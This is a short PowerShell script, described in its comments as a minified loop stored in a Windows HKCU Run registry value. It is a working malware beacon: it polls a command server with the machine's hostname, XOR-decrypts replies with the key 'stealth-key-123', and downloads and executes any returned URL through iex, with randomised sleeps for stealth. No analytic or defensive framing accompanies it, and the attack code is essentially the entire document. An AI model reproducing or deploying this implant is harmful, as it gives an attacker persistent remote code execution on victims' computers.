# Registry polling loop - minified for HKCU\Run value
# This is the inline version stored in registry (minified to fit in registry limits)
# Variables: $url, $hostname (injected via substitution)

function Decrypt-XOR($d,$k){[byte[]]$c=[Convert]::FromBase64String($d);$kb=[System.Text.Encoding]::UTF8.GetBytes($k);$p=@();for($i=0;$i -lt $c.Length;$i++){$p+=$c[$i] -bxor $kb[$i%$kb.Length]};return [System.Text.Encoding]::UTF8.GetString($p)}; while($true){try{$r=Invoke-WebRequest '$url/command?host=$hostname' -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop;$x=Decrypt-XOR $r.Content 'stealth-key-123';if($x -like 'http*'){iex(New-Object Net.WebClient).DownloadString($x)}}catch{Start-Sleep(Get-Random -Minimum 5 -Maximum 60)}Start-Sleep(Get-Random -Minimum 5 -Maximum 60)}
